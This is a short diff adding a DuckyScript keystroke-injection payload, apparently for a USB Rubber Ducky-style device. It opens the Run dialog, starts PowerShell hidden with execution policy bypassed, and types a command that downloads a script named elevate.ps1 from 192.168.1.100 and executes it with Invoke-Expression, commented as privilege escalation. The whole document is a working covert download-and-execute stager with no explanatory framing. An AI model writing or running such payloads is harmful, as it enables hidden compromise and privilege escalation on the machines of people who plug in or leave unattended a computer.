@@ -1,0 +1,12 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Privilege escalation
+STRING $Elevate = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.1.100/elevate.ps1')"
+ENTER
+DELAY 500
+STRING $Elevate | Invoke-Expression
+ENTER
